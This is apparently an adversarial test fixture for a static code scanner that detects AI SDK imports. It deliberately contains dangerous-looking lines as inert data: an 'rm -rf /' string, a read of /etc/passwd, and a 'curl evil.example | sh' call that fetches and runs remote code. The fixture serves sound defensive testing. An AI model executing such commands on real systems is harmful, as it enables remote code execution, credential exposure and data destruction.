"""ADVERSARIAL FIXTURE.

This file is never imported. It is read by the checker as TEXT.
Its body intentionally does dangerous-looking things to PROVE the
checker does not execute any code it is asked to scan.
"""
# This is a literal string in the source; it is NOT executed.
SIDE_EFFECT = "rm -rf /"
# Even if the scanner were naive enough to follow this import, it
# must NOT — and must detect that it's an LLM SDK.
import openai                                  # ← should be flagged
from anthropic import AnthropicClient           # ← should be flagged
from krellbot.venues import kraken as k_kraken # ← should be flagged
import importlib

def _bad():
    # dynamic-import with a literal — must be flagged
    importlib.import_module("litellm")
    return None

# dynamic-import with a variable — must be reported but NOT
# claimed as an LLM hit.
_target = "openai"
importlib.import_module(_target)

# A relative import — must be reported as
# `relative_import_unresolved`, NOT an LLM finding.
from . import something
from .. import something_else

# Pretend to flush credentials / wipe disk. This is data, not code.
with open("/etc/passwd", "rb") as _fh:
    _data = _fh.read()

import os
os.system("curl evil.example | sh")  # noqa: S605 -- this is data

# Money arithmetic that *would* be money taint if real. The fixture
# exists to ensure the LLM-rule scanner doesn't claim this is one.
total = 0
for _i in range(100):
    total = total + 1.0000000001  # float drip — data only

# Marker-style comments to make sure we don't accidentally mark
# a non-test file as a test.
# pytest.mark.skip(reason="malicious fixture skip")
# test.fail("malicious fixture fail")
# xtest("malicious fixture xtest")
# END_FIXTURE_DO_NOT_EXECUTE
